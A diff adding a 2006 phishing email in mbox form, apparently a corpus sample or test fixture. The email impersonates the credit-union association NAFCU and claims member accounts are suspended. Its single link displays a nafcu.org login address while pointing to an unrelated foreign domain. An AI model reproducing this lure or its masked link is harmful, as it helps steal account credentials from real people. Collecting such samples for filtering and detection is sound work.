@@ -1,0 +1,75 @@
+From nobody Sun Jan 25 13:49:59 2015
+Return-Path: <onlineservice@NAFCU.org>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4E55346857
+ for <user@login.example.com>; Tue, 29 Aug 2006 17:49:31 -0400 (EDT)
+Received: from jnix1 (mail.jwave.net [67.39.154.27])
+ by mail.example.org (Postfix) with ESMTP id 25B1C6FA432
+ for <user@example.com>; Tue, 29 Aug 2006 17:49:31 -0400 (EDT)
+Received: by jnix1 (Postfix, from userid 100)
+ id AE8191D867D; Tue, 29 Aug 2006 16:49:22 -0500 (CDT)
+Received: from User (unknown [129.44.37.85])
+ by jnix1 (Postfix) with ESMTP id CEE3B1D8674;
+ Tue, 29 Aug 2006 16:49:21 -0500 (CDT)
+Reply-To: <no.reply@NAFCU.org>
+From: "onlineservice@NAFCU.org" <onlineservice@NAFCU.org>
+Subject: Notification:Your Online Account Needs Re-activation.
+Date: Tue, 29 Aug 2006 17:52:47 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060829214921.CEE3B1D8674@jnix1>
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 149
+
+	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>NAFCU | ORG</title>
+</head>
+<img src="http://www.gaheritagefcu.org/images/ext_link_logos/logo_nafcu.gif">
+    <link  
+<body>
+
+<div style="width: 586px; margin: 1 auto 1 auto; border: 1px dashed blue; padding: 14px 14px 14px 14px; font-size:78%;">
+<p style="font-weight: bold; color: #072510; font-family: verdana;" ><font face="verdana" style="font-size: 9pt">Dear member,</p>
+<p style="font-weight: bold; color: #072510; font-family: verdana;" align="justify"><font face="verdana" style="font-size: 9pt">As the Internet and information technology enable us to expand our services, we are committed to maintaining the trust customers have placed in us for protecting the privacy and security of information we have about you. <br>In order to protect your information against unauthorized access, identity theft and account fraud we earnestly ask you to update your profile.</p>
+<p style="font-weight: bold; color: #072510; font-family: verdana;" align="justify"><font face="verdana" style="font-size: 9pt">Currently we are trying to upgrade our on-line security measures. <br>All accounts have been temp<font face="verdana" style="font-size: 9pt">orarly suspended untill each person completes our secure online form. <br>For this operation<font face="verdana" style="font-size: 9pt"> you will be required to pass trough a series of authentications.</p>
+
+<p align="justify"><font face="Arial" style="font-size: 9pt">Please login, authenticate and update your NAFCU.org account by checking the link below:</font></p>
+		<div style="border: 1px solid red; margin: 0px; padding-left: 0px; padding-right: 5px; padding-top: 0px; padding-bottom: 2px; background-color: rgb(242, 242, 225)">
+			<p style="color: rgb(7, 69, 128); font-family: Arial; margin: 0px; padding: 0px">
+			<span style="font-size: 9pt">&nbsp;&nbsp;&nbsp;
+			<a href="http://www.renosto.com.ar/nafcu.org-profile-verification/index.htm">
+			http://www.nafcu.org/Template.cfm?Section=Login&Template=/Security/Login.cfm</a></span></div>
+<br><font face="Arial" style="font-size: 10pt">Thank you for your prompt attention to this matter.<br><br><p style="font-weight: bold; color: red; font-family: verdana;" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER! &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REMEMBER!</p><font face="Arial" style="font-size: 10pt">We are always ready to help you.<br> Whether you need account assistance or answers to financial questions we are here for you. <br>Send us an email, call or write us.<br> You may also try our online help files. 
+<br>
+<br></b>Email us at: onlineservice@NAFCU.org
+<br>Call us at:  800.336.4644
+ or other Customer Service Numbers.
+
+<br><br>
+</FONT></FONT><font size="1" face="Arial, Helvetica, sans-serif" color="#6E6E6E">
+</font></span></td>
+
+
+<div align="left" style="margin-top:     px;MARGIN-BOTTOM: 10px; COLOR: #666666; font-family: verdana; text-align: left; height: 30px">© 2006 NAFCU. All rights reserved.
+
+</div>
+
+
+		
+</div>
+</body>
+</html>
